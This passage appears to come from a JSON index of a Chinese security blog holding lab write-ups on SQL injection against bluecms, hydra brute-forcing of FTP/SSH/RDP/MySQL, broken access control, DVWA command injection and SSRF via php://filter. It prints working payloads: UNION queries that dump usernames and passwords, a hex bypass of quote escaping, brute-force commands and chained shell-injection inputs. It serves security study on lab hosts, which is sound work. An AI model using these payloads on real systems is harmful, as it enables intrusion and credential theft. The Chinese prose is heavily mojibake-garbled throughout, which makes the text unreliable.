‡å‡†æ¨¡å¼\nè·å¾—æ•°æ®åº“åbluecms\nè·å¾—ç”¨æˆ·å\nè·å¾—å½“å‰åº“ä¸­çš„æ‰€æœ‰è¡¨\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() æ³¨å…¥blue_userè¡¨ä¸­çš„å­—æ®µï¼Œå‘ç°æŠ¥é”™ï¼Œè¿™é‡Œæœ‰è¿‡æ»¤ï¼Œå•å¼•å·å‰é¢å‡ºç° \\ ï¼Œè¯æ˜å•å¼•å·è¢«è½¬ä¹‰äº†\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;blue_user\u0026#39; ä½¿ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡ï¼ˆblue_user 16è¿›åˆ¶ç¼–ç ä¸º 0x626c75655f75736572 ï¼‰ï¼š\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f75736572 è·å–åˆ°blue_userè¡¨ä¸­çš„å­—æ®µ\næ³¨å…¥bluecmsåº“ä¸­blue_userè¡¨ä¸­user_nameä»¥åŠpwdçš„å­—æ®µå†…å®¹(0x20 æ˜¯ç©ºæ ¼çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰ï¼š\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,concat_ws(0x20,user_name,pwd) from blue_user è‡³æ­¤ï¼Œå°±æ‹¿ä¸‹äº†è¯¥ç³»ç»Ÿçš„æ•´ä¸ªæ•°æ®åº“ã€‚åé¢å°±å¯ä»¥è€ƒè™‘è·¨åº“äº†ï¼ˆè¿™é‡Œä¸åšæ¼”ç¤ºï¼‰\n","permalink":"https://senmer.github.io/zh/posts/tech/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/","summary":"\u003cp\u003eï¼ˆ1ï¼‰bluecmsæ—æ³¨æ¼æ´ç»ƒä¹ \u003c/p\u003e\n\u003cp\u003eï¼ˆ2ï¼‰ä¸ºä»€ä¹ˆæ—ç«™æ”»å‡»å¯ä»¥æ‹¿ä¸‹ä¸»ç«™ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eï¼ˆ3ï¼‰è·¨åº“çš„æ„æ€æ˜¯ä»€ä¹ˆï¼Ÿ\u003c/p\u003e","title":"æ—æ³¨ä¸è·¨åº“"},{"content":"æš´åŠ›çŒœè§£ï¼šhydraå®ç°å¯¹ftpã€sshã€rdpã€mysqlçš„æš´åŠ›ç ´è§£\n1 å®éªŒç¯å¢ƒ æœåŠ¡åç§° éƒ¨ç½²æ–¹å¼ ç‰ˆæœ¬ IP FTP phpStudyéƒ¨ç½² 172.31.5.1 MySQL phpStudyéƒ¨ç½² 172.31.5.1 RDP ç³»ç»Ÿè‡ªå¼€ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯ 172.31.5.33 ssh ç³»ç»Ÿè‡ªå¸¦ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯ 172.31.5.7 2 æš´åŠ›æ‹†è§£ç®€ä»‹ æš´åŠ›ç ´è§£æ˜¯ä¸€ç§é’ˆå¯¹äºå¯†ç çš„ç ´è¯‘æ–¹æ³•ï¼Œå³é€šè¿‡å¯†ç å­—å…¸é€ä¸ªå°è¯•ç›´åˆ°æ‰¾å‡ºçœŸæ­£çš„å¯†ç ã€‚\n2.1 C/Sæ¶æ„æš´åŠ›ç ´è§£ å¸¸è§çˆ†ç ´åè®®å’Œæ•°æ®åº“ï¼š\nFTP SSH SMB SQL server MySQL Redis 2.2 B/Sæ¶æ„æš´åŠ›ç ´è§£ æš´åŠ›ç ´è§£äº§ç”Ÿæ˜¯ç”±äºæœåŠ¡å™¨æ²¡æœ‰å¯¹æ¥æ”¶çš„å‚æ•°è¿›è¡Œé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›æ‰‹æ®µè¿›è¡Œç ´è§£æ‰€éœ€è¦çš„ä¿¡æ¯(å¦‚è´¦å·,å¯†ç ,éªŒè¯ç ç­‰)ï¼Œæš´åŠ›ç ´è§£çš„åŸç†å°±æ˜¯ç©·ä¸¾æ³•ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯æ ¹æ®éƒ¨åˆ†æ¡ä»¶ç¡®å®šå·²çŸ¥æ¡ä»¶çš„å¤§è‡´èŒƒå›´ï¼Œå¹¶åœ¨æ­¤èŒƒå›´å†…å¯¹æ‰€æœ‰å¯èƒ½çš„æƒ…å†µé€ä¸€éªŒè¯,ç›´åˆ°å…¨éƒ¨æƒ…å†µéªŒè¯å®Œæ¯•ã€‚\n3 æš´åŠ›ç ´è§£æ¼”ç¤º 3.1 hydra ä»‹ç» hydra æ˜¯ä¸€ä¸ªç½‘ç»œå¸å·ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ã€‚å…¶ä½œè€…æ˜¯van Hauser,David Maciejakä¸å…¶å…±åŒç»´ æŠ¤ã€‚hydraåœ¨æ‰€æœ‰æ”¯æŒGCCçš„å¹³å°èƒ½å¾ˆå¥½çš„ç¼–è¯‘ï¼ŒåŒ…æ‹¬Linux,æ‰€æœ‰ç‰ˆæœ¬çš„BSD,Mac OS, Solarisç­‰\nhydra å¸¸ç”¨å‚æ•°ï¼š\n-l æŒ‡å®šä¸€ä¸ªç”¨æˆ·å -P æŒ‡å®šä¸€ä¸ªå¯†ç å­—å…¸ -s æŒ‡å®šç«¯å£ -L æŒ‡å®šä¸€ä¸ªç”¨æˆ·åå­—å…¸ -vV æ˜¾ç¤ºæ¯æ¬¡çš„å°è¯•ä¿¡æ¯ -f é‡åˆ°æ­£ç¡®çš„å¯†ç ï¼Œåœæ­¢çˆ†ç ´ -o å°†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ä¸­ -M æŒ‡å®šä¸€ä¸ªæœåŠ¡å™¨åˆ—è¡¨ -t TasksåŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°,é»˜è®¤ä¸º16 -e nsr nï¼šå°è¯•ç©ºå¯†ç  sï¼šå°†ç”¨æˆ·åä½œä¸ºå¯†ç  rï¼šå°†ç”¨æˆ·ååå‘ 3.2 FTP çˆ†ç ´ ä½¿ç”¨phpStudy Proæ­å»ºFTPç«™ç‚¹ï¼Œè´¦å·/å¯†ç ï¼štest/testã€‚æ³¨æ„ï¼šåœ¨é¦–é¡µå¼€å¯ftp\n#æ‰§è¡Œçˆ†ç ´å‘½ä»¤\nhydra 192.168.108.129 ftp -l ftp -P pwd.txt -vV -f -e ns çˆ†ç ´æˆåŠŸ\n3.2 ssh çˆ†ç ´ ä»¥CentOS7ï¼ˆIPï¼š172.31.5.7ï¼‰ï¼Œå¼€å¯sshdæœåŠ¡\nsystemctl start sshd åˆ›å»ºè´¦å·test, å¯†ç ï¼štest\nuseradd test \u0026amp;\u0026amp; echo test | passwd --stdin test æ‰§è¡Œçˆ†ç ´å‘½ä»¤\nhydra 172.31.5.7 ssh -l test -P pwd.txt -t 5 -vV -e ns çˆ†ç ´æˆåŠŸ\n3.3 RDP çˆ†ç ´ ä»¥windows7ä¸ºä¾‹ï¼ˆIPï¼š 172.31.5.33ï¼‰ï¼Œå¼€å¯RDPæœåŠ¡å¹¶æˆæƒtestè´¦å·è¿æ¥ï¼Œè´¦å·å¯†ç test\næ‰§è¡Œçˆ†ç ´å‘½ä»¤\nhydra 172.31.5.33 rdp -l test -P pwd.txt -vV -f -e nsr çˆ†ç ´æˆåŠŸ\n3.4 MySQL çˆ†ç ´ phpStudy é¦–é¡µå¼€å¯MySQLæœåŠ¡\nå®‰è£…æ•°æ®åº“å‰ç«¯ç®¡ç†å·¥å…·\næ‰“å¼€å‰ç«¯ç®¡ç†å·¥å…·\næ–°å»ºè´¦å·test%ï¼Œå¯†ç test\næ‰§è¡Œçˆ†ç ´å‘½ä»¤\nhydra 172.31.5.1 mysql -l test -P pwd.txt -vV -f -e nsr çˆ†ç ´æˆåŠŸ\n","permalink":"https://senmer.github.io/zh/posts/tech/brute_force/brute_force/","summary":"\u003cp\u003eæš´åŠ›çŒœè§£ï¼šhydraå®ç°å¯¹ftpã€sshã€rdpã€mysqlçš„æš´åŠ›ç ´è§£\u003c/p\u003e","title":"Brute_force"},{"content":"ï¼ˆ1ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šDVWA-Lowçº§åˆ«ï¼Œè¦æ±‚æŠŠå‘½ä»¤çš„æ“ä½œæ–¹å¼å…¨éƒ¨ç»ƒä¹ ä¸€éï¼›\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° éƒ¨ç½²æ–¹å¼ ç‰ˆæœ¬ IP Pikachu docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu latest 172.31.5.7 äºŒã€æ¼æ´ç®€ä»‹ï¼ˆBACï¼‰ è¶Šæƒè®¿é—®ï¼ˆBroken Access Controlï¼Œç®€ç§°BACï¼‰æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„æ¼æ´ï¼Œç”±äºå…¶å­˜åœ¨èŒƒå›´å¹¿ã€å±å®³å¤§ï¼Œè¢«OWASPåˆ—ä¸ºWebåº”ç”¨åå¤§å®‰å…¨éšæ‚£çš„ç¬¬ä¸€åã€‚\nè¯¥æ¼æ´æ˜¯æŒ‡åº”ç”¨åœ¨æ£€æŸ¥æˆæƒæ—¶å­˜åœ¨çº°æ¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨è·å¾—ä½æƒé™ç”¨æˆ·è´¦æˆ·åï¼Œåˆ©ç”¨ä¸€äº›æ–¹å¼ç»•è¿‡æƒé™æ£€æŸ¥ï¼Œè®¿é—®æˆ–è€…æ“ä½œå…¶ä»–ç”¨æˆ·æˆ–è€…æ›´é«˜æƒé™ã€‚\nè¶Šæƒæ¼æ´çš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šã€‚\nåœ¨å®é™…çš„ä»£ç å®¡è®¡ä¸­ï¼Œè¿™ç§æ¼æ´å¾€å¾€å¾ˆéš¾é€šè¿‡å·¥å…·è¿›è¡Œè‡ªåŠ¨åŒ–ç›‘æµ‹ï¼Œå› æ­¤åœ¨å®é™…åº”ç”¨ä¸­å±å®³å¾ˆå¤§ã€‚å…¶ä¸æœªæˆæƒè®¿é—®æœ‰ä¸€å®šå·®åˆ«ï¼Œç›®å‰å­˜åœ¨ç€ä¸¤ç§è¶Šæƒæ“ä½œç±»å‹ï¼Œæ¨ªå‘è¶Šæƒæ“ä½œï¼ˆæ°´å¹³è¶Šæƒï¼‰å’Œçºµå‘è¶Šæƒæ“ä½œï¼ˆå‚ç›´è¶Šæƒï¼‰ã€‚\næ°´å¹³è¶Šæƒ: æŒ‡ç›¸åŒæƒé™ä¸‹ä¸åŒçš„ç”¨æˆ·å¯ä»¥äº’ç›¸è®¿é—® å‚ç›´è¶Šæƒ: æŒ‡ä½¿ç”¨æƒé™ä½çš„ç”¨æˆ·å¯ä»¥è®¿é—®åˆ°æƒé™è¾ƒé«˜çš„ç”¨æˆ· **æ°´å¹³è¶Šæƒæµ‹è¯•æ–¹æ³•ï¼š**ä¸»è¦é€šè¿‡çœ‹çœ‹èƒ½å¦é€šè¿‡Aç”¨æˆ·æ“ä½œå½±å“åˆ°Bç”¨æˆ· **å‚ç›´è¶Šæƒæµ‹è¯•æ–¹æ³•ï¼š**çœ‹çœ‹ä½æƒé™ç”¨æˆ·æ˜¯å¦èƒ½è¶Šæƒä½¿ç”¨é«˜æƒé™ç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜çš„åŠŸèƒ½ã€‚\nä¸‰ã€æ¼æ´æ¼”ç¤º 3.1 æ°´å¹³è¶Šæƒ ä½¿ç”¨allenç”¨æˆ·ç™»å½•å¹¶æŸ¥çœ‹ä¸ªäººä¿¡æ¯\nå°†URLä¸­çš„usernameå‚æ•°å€¼æ”¹ä¸ºlucyåå›è½¦ï¼ŒæŸ¥çœ‹åˆ°lucyç”¨æˆ·çš„ä¿¡æ¯\n3.2 å‚ç›´è¶Šæƒ è¿™é‡Œæœ‰ä¸¤ä¸ªç”¨æˆ·admin/123456, pikachu/000000, adminæ˜¯è¶…çº§boss\nä½¿ç”¨adminè´¦å·ç™»å½•ï¼Œå‘ç°æƒé™è¾ƒå¤§\nç‚¹å‡»æ·»åŠ ç”¨æˆ·è·å¾—æ·»åŠ ç”¨æˆ·çš„æ¥å£ï¼ˆburpæŠ“åŒ…å‘ç°è¯¥æ¥å£æ²¡æœ‰æäº¤é¢å¤–çš„å‚æ•°è¿›è¡Œèº«ä»½éªŒè¯ï¼‰\nhttp://172.31.5.7:8080/vul/overpermission/op2/op2_admin_edit.php ä½¿ç”¨pikachuç”¨æˆ·ç™»å½•å¹¶è®¿é—®ä¸Šæ–‡è·å¾—çš„æ¥å£ï¼Œå‘ç°å¯ä»¥æ­£å¸¸è®¿é—®\nè¾“å…¥ddåç‚¹å‡»åˆ›å»ºï¼Œä¼šå›åˆ°ç™»å½•ç•Œé¢ã€‚ä½¿ç”¨adminè´¦å·ç™»å½•åï¼Œå‘ç°ddç”¨æˆ·å·²è¢«åˆ›å»º\nå››ã€æ¼æ´ä¿®å¤ 1ã€å‰åç«¯åŒæ—¶å¯¹ç”¨æˆ·è¾“å…¥ä¿¡æ¯è¿›è¡Œæ ¡éªŒï¼ŒåŒé‡éªŒè¯æœºåˆ¶ 2ã€æ‰§è¡Œå…³é”®æ“ä½œå‰å¿…é¡»éªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦å…·å¤‡æ“ä½œæ•°æ®çš„æƒé™ 3ã€ç‰¹åˆ«æ•æ„Ÿæ“ä½œå¯ä»¥è®©ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç æˆ–å…¶ä»–çš„éªŒè¯ä¿¡æ¯ï¼Œé˜²èŒƒCSRF 4ã€ä»ç”¨æˆ·çš„åŠ å¯†è®¤è¯ cookie ä¸­è·å–å½“å‰ç”¨æˆ· idï¼Œé˜²æ­¢æ”»å‡»è€…å¯¹å…¶ä¿®æ”¹ã€‚æˆ–åœ¨ sessionã€cookie ä¸­åŠ å…¥ä¸å¯é¢„æµ‹ã€ä¸å¯çŒœè§£çš„ user ä¿¡æ¯ 5ã€ç›´æ¥å¯¹è±¡å¼•ç”¨çš„èµ„æºIDè¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢æ”»å‡»è€…æšä¸¾IDï¼Œæ•æ„Ÿæ•°æ®ç‰¹æ®ŠåŒ–å¤„ç†\n","permalink":"https://senmer.github.io/zh/posts/tech/bac/bac/","summary":"\u003cp\u003eï¼ˆ1ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šDVWA-Lowçº§åˆ«ï¼Œè¦æ±‚æŠŠå‘½ä»¤çš„æ“ä½œæ–¹å¼å…¨éƒ¨ç»ƒä¹ ä¸€éï¼›\u003c/p\u003e","title":"BAC"},{"content":"ï¼ˆ1ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šDVWA-Lowçº§åˆ«ï¼Œè¦æ±‚æŠŠå‘½ä»¤çš„æ“ä½œæ–¹å¼å…¨éƒ¨ç»ƒä¹ ä¸€éï¼›\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP DVWA latest docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 äºŒã€ä»€ä¹ˆæ˜¯RCEï¼Ÿ RCEè‹±æ–‡å…¨ç§°ï¼šremote command/code executeï¼Œåˆ†ä¸º è¿œç¨‹å‘½ä»¤æ‰§è¡Œå’Œ è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚\n2.1 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å‡ºç°åŸå› ï¼šå› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ã€‚æ¯”å¦‚å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šï¼Œä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œå¦‚æœè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚\nä¾‹å¦‚ï¼šå¦‚ä»Šå¾ˆå¤šç”²æ–¹ä¼ä¸šçš„è‡ªåŠ¨åŒ–è¿ç»´å¹³å°ï¼Œå¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€œè‡ªåŠ¨åŒ–è¿ç»´â€å¹³å°è¿›è¡Œæ“ä½œï¼Œå…¶ä¸­ å¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚\n2.2 è¿œç¨‹ä»£ç æ‰§è¡Œ å‡ºç°åŸå› ï¼šå› ä¸ºéœ€æ±‚è®¾è®¡ï¼Œåå°æœ‰æ—¶å€™ä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿé€ æˆäº†è¿œç¨‹ä»£ç  æ‰§è¡Œæ¼æ´ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚\n2.3 é˜²å¾¡ å¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£çš„è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ ä¸¥æ ¼çš„ç™½åå•æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ³•ã€‚\nä¸‰ã€DVWAæ¼æ´æ¼”ç¤º 2.1 Lowçº§åˆ« dvwaçš„å‘½ä»¤æ³¨å…¥æ¨¡å—ï¼Œæä¾›äº†ä¸€ä¸ªæ£€æµ‹IPæ˜¯å¦å­˜æ´»çš„åŠŸèƒ½ã€‚å¦‚ï¼šè¾“å…¥127.0.0.1\nåœ¨æ­¤æ¨¡å—ä¸­ï¼Œæœ‰ä»¥ä¸‹å¸¸ç”¨é€»è¾‘è¿ç®—æ“ä½œå¯åˆ©ç”¨\nA \u0026amp;\u0026amp; Bï¼š å…ˆæ‰§è¡ŒAï¼Œå¦‚æœæˆåŠŸï¼Œæ‰§è¡ŒBï¼› A || Bï¼š å…ˆæ‰§è¡ŒAï¼Œå¦‚æœå¤±è´¥ï¼Œæ‰§è¡ŒBï¼› A | Bï¼šç®¡é“ç¬¦ï¼Œå…ˆæ‰§è¡ŒAåï¼Œå°†Açš„ç»“æœä½œä¸ºBçš„è¾“å…¥ï¼Œæ‰“å°çš„æ˜¯Bçš„ç»“æœï¼› A \u0026amp; Bï¼š å…ˆæ‰§è¡ŒAï¼Œç„¶åä¸ç®¡æˆåŠŸä¸å¦ï¼Œæ‰§è¡ŒBï¼› ç¤ºä¾‹ï¼š\n127.0.0.1 \u0026amp;\u0026amp; ls false || ls 127.0.0.1 | ls 127.0.0.1 \u0026amp; ls è¿™é‡Œ \u0026amp; è¡¨ç¤ºå°†ä»»åŠ¡è‡³äºåå°æ‰§è¡Œï¼Œå› ä¸º ls æ‰§è¡Œæ¯”è¾ƒå¿«ï¼Œæ‰€ä»¥ç»“æœæ˜¾ç¤ºåœ¨å‰é¢\n","permalink":"https://senmer.github.io/zh/posts/tech/rce/rce/","summary":"\u003cp\u003eï¼ˆ1ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šDVWA-Lowçº§åˆ«ï¼Œè¦æ±‚æŠŠå‘½ä»¤çš„æ“ä½œæ–¹å¼å…¨éƒ¨ç»ƒä¹ ä¸€éï¼›\u003c/p\u003e","title":"RCE"},{"content":"(1) SSRFï¼ˆfile_get_contentï¼‰ï¼Œè·å–ssrf.phpçš„æºç ï¼›\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP Pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 äºŒã€æ¼æ´ç®€ä»‹ SSRF(Server-Side Request Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚æ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿã€‚\n2.1 åŸç† SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚é€šè¿‡æ§åˆ¶åŠŸèƒ½ä¸­çš„å‘èµ·è¯·æ±‚çš„æœåŠ¡æ¥å½“ä½œè·³æ¿æ”»å‡»å†…ç½‘ä¸­å…¶ä»–æœåŠ¡ã€‚æ¯”å¦‚ï¼Œé€šè¿‡æ§åˆ¶å‰å°çš„è¯·æ±‚è¿œç¨‹åœ°å€åŠ è½½çš„å“åº”ï¼Œæ¥è®©è¯·æ±‚æ•°æ®ç”±è¿œç¨‹çš„URLåŸŸåä¿®æ”¹ä¸ºè¯·æ±‚æœ¬åœ°ã€æˆ–è€…å†…ç½‘çš„IPåœ°å€åŠæœåŠ¡ï¼Œæ¥é€ æˆå¯¹å†…ç½‘ç³»ç»Ÿçš„æ”»å‡»ã€‚\n2.2 å±å®³ 1ã€æ‰«æå†…ç½‘å¼€æ”¾æœåŠ¡ 2ã€å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€payloadæ¥æ”»å‡»å†…ç½‘æœåŠ¡ 3ã€DOSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥Keep-Alive Alwaysï¼‰ 4ã€æ”»å‡»å†…ç½‘çš„webåº”ç”¨ï¼Œä¾‹å¦‚ç›´æ¥SQLæ³¨å…¥ã€XSSæ”»å‡»ç­‰ 5ã€åˆ©ç”¨fileã€gopherã€dictåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ç­‰\nä¸‰ã€æ¼æ´æ¼”ç¤º 3.1 SSRFï¼ˆfile_get_contentï¼‰ file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚\nphp://filterï¼šæ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚\nphp://filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚è¯¦ç»†ä½¿ç”¨ è¿™äº›å‚æ•°å¯ä»¥å‚è€ƒå…·ä½“èŒƒä¾‹ã€‚\nåç§° æè¿° resource=\u0026lt;è¦è¿‡æ»¤çš„æ•° æ®æµ\u0026gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµï¼Œå³è¦è¯»çš„æ–‡ ä»¶ã€‚ read=\u0026lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨\u0026gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ | ï¼‰åˆ† éš”ã€‚ write=\u0026lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨ \u0026gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ | ï¼‰åˆ† éš”ã€‚ \u0026lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨\u0026gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äº è¯»æˆ–å†™é“¾ã€‚ file_get_contentsé‡Œé¢å¸¦æœ‰php://filter æˆ‘ä»¬ç”¨è¿™ä¸ªå°±å¯ä»¥æ¥è¯»å–phpæºç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥æ„é€ URLï¼š\nhttp://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php æµè§ˆå™¨è¾“å…¥ï¼ŒæˆåŠŸåœ¨SSRF(file_get_content)é¡µé¢è¯»å–åˆ°æ¦‚è¿°é¡µé¢\nä¸Šå›¾ä¸­ï¼Œssrf.phpæ–‡ä»¶è¢«è§£ææˆäº†ç½‘é¡µè¿›è¡Œæ˜¾ç¤ºã€‚å¦‚æœéœ€è¦è¯»å–æºç ï¼Œè€Œä¸å¸Œæœ›è¯¥æ–‡ä»¶å†…è¢«è§£æï¼Œéœ€è¦åœ¨readå‚æ•°ä¸­åŠ å…¥ convert.base64-encode\nhttp://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64- 